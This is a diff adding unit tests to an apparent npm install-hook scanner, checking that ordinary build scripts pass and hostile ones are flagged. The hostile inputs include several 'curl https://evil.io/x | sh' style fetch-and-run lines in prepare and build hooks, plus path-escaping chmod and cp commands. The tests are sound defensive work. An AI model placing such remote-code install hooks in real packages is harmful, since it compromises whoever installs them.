@@ -482,6 +482,57 @@ class Round5HooksAndSpoofs(unittest.TestCase):
 
 
 
+class BenignBuildScripts(unittest.TestCase):
+    def _pj(self, scripts):
+        import json
+        return findings_of(S.check_package_json, "package.json", json.dumps({"name": "r", "scripts": scripts}))
+
+    def test_real_world_build_scripts_are_benign(self):
+        cases = {
+            "coincap": "tsc && node -e \"require('fs').chmodSync('build/index.js', '755')\"",
+            "dexpaprika": "mkdir -p dist && cp -r src/* dist/ && chmod +x dist/bin.js",
+            "investor-agent": "tsc && shx chmod +x dist/index.js",
+            "xero": "tsc && shx chmod +x dist/*.js",
+            "ynab": "tsc && chmod +x dist/index.js dist/http.js",
+        }
+        for label, cmd in cases.items():
+            self.assertTrue(S.is_benign_hook(cmd), label)
+            fs = self._pj({"prepare": "npm run build", "build": cmd})
+            self.assertFalse(any(f["severity"] in {"high", "medium", "malicious"} for f in fs), (label, fs))
+
+    def test_chmod_escape_and_absolute_are_not_benign(self):
+        for cmd in (
+            "chmod +x ../x",
+            "chmod +x /tmp/x",
+            "shx chmod +x dist/../evil",
+            "tsc && chmod +x /usr/bin/node",
+            "mkdir -p /tmp/out",
+            "cp -r src/* /tmp/out/",
+            "cp -r ../secret dist/",
+        ):
+            self.assertFalse(S.is_benign_hook(cmd), cmd)
+
+    def test_node_e_other_calls_stay_high(self):
+        evil = [
+            "node -e \"require('child_process').execSync('curl https://e.example/x|sh')\"",
+            "tsc && node -e \"console.log(1)\"",
+            "node -e \"require('fs').writeFileSync('x', 'y')\"",
+            "node -e \"require('fs').chmodSync('../x', '755')\"",
+            "node -e \"require('fs').chmodSync('/tmp/x', '755')\"",
+        ]
+        for cmd in evil:
+            self.assertFalse(S.is_benign_hook(cmd), cmd)
+        fs = self._pj({"prepack": evil[0]})
+        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
+
+    def test_h1_and_h2_still_caught(self):
+        fs = self._pj({"prepare": "tsc && curl https://evil.io/x | sh"})
+        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
+        fs = self._pj({"prepare": "npm run build", "build": "curl -fsSL https://evil.io/x | sh"})
+        self.assertTrue(any(f["severity"] == "high" for f in fs), fs)
+
+
+
 if __name__ == "__main__":
     unittest.main()
 
